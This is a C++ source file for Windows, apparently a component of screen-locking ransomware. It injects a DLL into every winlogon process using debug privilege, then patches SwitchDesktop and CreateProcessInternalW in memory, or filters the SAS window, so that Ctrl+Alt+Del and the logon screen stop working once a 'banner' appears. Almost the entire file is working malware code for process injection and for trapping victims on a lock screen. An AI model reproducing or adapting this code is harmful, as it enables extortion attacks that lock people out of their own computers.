#include <windows.h>
#include <time.h>
#include <stdio.h>
#include <process.h>
#include <hash_map>
#include <hash_set>
#include <list>
#include <shlwapi.h>
#include <assert.h>


#include "getapi.h"
#include "inject.h"
#include "threading.h"
#include "dprint.h"
#include "winlgnblock.h"
#include "msgfilter.h"
#include "procenum.h"
#include "privileges.h"
#include "main.h"
#include "banner.h"


void WinlogonPatchForDisableCtrlAtlDel()
{

#ifdef _M_AMD64
# error ERROR: code is not ready for X64
#endif

	//	xor eax,eax
	//	ret 4
	BYTE patch_code_SwitchDesktop[] = { 0x33,0xC0,0xc2,0x04,0x00 };	
	
	//	xor eax,eax
	//	ret 0x30
	BYTE patch_code_CreateProcessInternalW[] = {0x33,0xC0,0xc2,0x30,0x00};

	DWORD Protect;
	PVOID pFunction;

	//	запрет показа окна входа в виндовс
  PP_DPRINTF(L"WinlogonPatchForDisableCtrlAtlDel: SwitchDesktop patching...");
	if ( pFunction = GetProcAddress(GetModuleHandleA("USER32"),"SwitchDesktop") )
	{
		VirtualProtect(pFunction,sizeof(patch_code_SwitchDesktop),PAGE_EXECUTE_READWRITE,&Protect);
		memcpy(pFunction,patch_code_SwitchDesktop,sizeof(patch_code_SwitchDesktop));
		VirtualProtect(pFunction,sizeof(patch_code_SwitchDesktop),Protect,&Protect);
    PP_DPRINTF(L"WinlogonPatchForDisableCtrlAtlDel: SwitchDesktop patched.");
	}

	//	запрет запуска процессов винлогону
  PP_DPRINTF(L"WinlogonPatchForDisableCtrlAtlDel: CreateProcess patching...");
	if ( pFunction = GetProcAddress(GetModuleHandleA("KERNEL32"),"CreateProcessInternalW") )
	{
		VirtualProtect(pFunction,sizeof(patch_code_CreateProcessInternalW),PAGE_EXECUTE_READWRITE,&Protect);
		memcpy(pFunction,patch_code_CreateProcessInternalW,sizeof(patch_code_CreateProcessInternalW));
		VirtualProtect(pFunction,sizeof(patch_code_CreateProcessInternalW),Protect,&Protect);
    PP_DPRINTF(L"WinlogonPatchForDisableCtrlAtlDel: CreateProcess patched.");
	}
}

void SetWinlogonSASWindowFilter()
{
  HWND hwnd = ::FindWindow(L"SAS Window class", L"SAS Window");

  PP_DPRINTF(L"SetWinlogonSASWindowFilter: SAS window search resut wnd=0x%X (pid=%d).", 
    hwnd, GetCurrentProcessId()
    );

  if (hwnd == NULL) return;

  MsgFilter::Instance().SetWndProcFilter(hwnd);
}

void BlockWinlogonAltCtrlDel()
{
  OSVERSIONINFOEX ver;
  bool            ver_detected = false;

  ver.dwOSVersionInfoSize = sizeof(ver);
  ver_detected = (GetVersionEx((LPOSVERSIONINFO)&ver) == TRUE);

  PP_DPRINTF(L"BlockWinlogonAltCtrlDel: windows version detecting result=%d MajorVersion=%d", 
    ver_detected,
    ver.dwMajorVersion
    );

  if (!ver_detected)
  {
    SetWinlogonSASWindowFilter();
    WinlogonPatchForDisableCtrlAtlDel();   
    return;
  }

  switch (ver.dwMajorVersion)
  {
  case 6: // >= Vista, 2008 Server
    WinlogonPatchForDisableCtrlAtlDel(); 
    break;

  default:
    SetWinlogonSASWindowFilter();
  };
}

unsigned __stdcall WinlogonBlockThread(void* p)
{
  PP_DPRINTF(L"WinlogonBlockThread: started.");

  while (true)
  {
    Sleep(1);
    if (BannerStarted())  break;
  }

  BlockWinlogonAltCtrlDel();

  _endthreadex(0);
  return 0; 
}

bool IsCurrentProcessNotWinlogon()
{
  return !IsCurrentProcessCorrespondToFilter(
    ProcessFilter_Winlogon);
}

void TryInitWinlogonFiltering()
{
  PP_DPRINTF(L"TryInitWinlogonFiltering: started.");
  
  PP_RETURNIF1( IsCurrentProcessNotWinlogon() );

  unsigned th_id;
  HANDLE th = (HANDLE)_beginthreadex(NULL, 0, &WinlogonBlockThread, NULL, 0, &th_id);
  if (th) CloseHandle(th);
}

void WINAPI Export_StartWinlogonBlockInjecting(void* self_dll_body)
{
  stdext::hash_set<DWORD> injected_pids;

  InitializeAPI();

  while (true)
  {
    DWORD pids[200];
    DWORD pid_count = 0;

    FilteredEnumProcesses(ProcessFilter_Winlogon, pids, ARRAYSIZE(pids), &pid_count);
    for (DWORD i = 0; i < pid_count; i++)
    {
      DWORD pid = pids[i];
      PVOID r = NULL;

      if (injected_pids.find(pid) != injected_pids.end()) 
        continue;

      ScopedDebugPrivilege dp;

      if (!dp.Enabled())
      {
        PP_DPRINTF(L"StartWinlogonBlockInjecting: debug privileges NOT ENABLED.");
        
        Sleep(5000);
        continue;
      }

      HANDLE p = OpenProcess(PROCESS_CREATE_THREAD | 
        PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | 
        PROCESS_VM_WRITE | PROCESS_VM_READ,
        false, pid);

      DWORD le = GetLastError();

      PP_DPRINTF(L"StartWinlogonBlockInjecting: Opening Winlogon process result pid=%d handle=0x%X le=%d",
        pid, p, le);

      r = InjectRemouteDll(p, self_dll_body, NULL, 0);
      if (r != NULL) injected_pids.insert(pid);
      if (p) CloseHandle(p);

      PP_DPRINTF(L"StartWinlogonBlockInjecting: Dll injected result into Winlogon: pid=%d res=0x%p",
        pid, r);
    }
    Sleep(1);
  }
}